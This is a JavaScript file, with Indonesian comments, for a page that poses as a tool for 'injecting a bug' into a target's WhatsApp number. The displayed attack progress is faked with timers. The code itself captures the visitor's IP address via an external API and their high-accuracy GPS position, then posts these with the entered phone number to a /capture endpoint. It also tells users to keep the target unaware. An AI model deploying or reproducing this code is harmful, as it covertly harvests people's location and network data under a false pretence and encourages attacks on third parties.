document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('bugForm');
    const loading = document.getElementById('loading');
    const result = document.getElementById('result');
    const details = document.getElementById('details');
    const sessionId = 'wa-bug-' + Math.floor(Math.random() * 100);

    // Tangkap data dasar saat page load (IP, screen, dll)
    const screen = `${window.screen.width}x${window.screen.height}`;
    let userIP = '';
    let gpsData = null;

    // Dapatkan IP via API
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            userIP = data.ip;
            console.log('[+] IP Captured:', userIP);
        });

    // Minta izin GPS
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                gpsData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                console.log('[+] GPS Captured:', gpsData);
            },
            (error) => {
                console.log('[-] GPS Denied');
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // Tangani form submit
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const phone = '+62' + document.getElementById('phone').value;
        const method = document.querySelector('input[name="method"]:checked').value;
        const duration = document.getElementById('duration').value;

        // Tampilkan loading
        loading.style.display = 'block';
        result.style.display = 'none';
        details.innerHTML = 'Mengirim payload ke server WhatsApp...';

        // Simulasi proses
        setTimeout(() => {
            details.innerHTML = 'Membuka koneksi ke target...';
        }, 1500);

        setTimeout(() => {
            details.innerHTML = 'Menginjeksi bug ' + method + '...';
        }, 3000);

        // Kirim data ke server
        setTimeout(async () => {
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone,
                        method,
                        gps: gpsData,
                        screen,
                        ip: userIP
                    })
                });

                const data = await response.json();

                // Tampilkan hasil
                loading.style.display = 'none';
                result.style.display = 'block';
                result.style.backgroundColor = 'rgba(37, 211, 102, 0.2)';
                result.style.color = '#25D366';
                result.style.border = '2px solid #25D366';
                result.innerHTML = `
                    <h3><i class="fas fa-check-circle"></i> BUG BERHASIL DIKIRIM!</h3>
                    <p>Target: ${phone}</p>
                    <p>Metode: ${method.toUpperCase()}</p>
                    <p>Durasi: ${duration} jam</p>
                    <p>Status: Active</p>
                    <p><small>Bug akan aktif dalam 2-5 menit. Jangan beri tahu target.</small></p>
                `;

                // Log ke console (kaya di gambar)
                console.log(`
    \x1b[32m[+]\x1b[0m BUG DEPLOYED
    Target: ${phone}
    Method: ${method}
    GPS: ${gpsData ? 'Captured' : 'Not Available'}
    IP: ${userIP}
    Time: ${new Date().toLocaleString('id-ID')}
                `);

            } catch (error) {
                loading.style.display = 'none';
                result.style.display = 'block';
                result.style.backgroundColor = 'rgba(255, 100, 100, 0.2)';
                result.style.color = '#ff6464';
                result.innerHTML = '<p>Error: Gagal mengirim bug. Coba lagi.</p>';
            }
        }, 5000);
    });
});
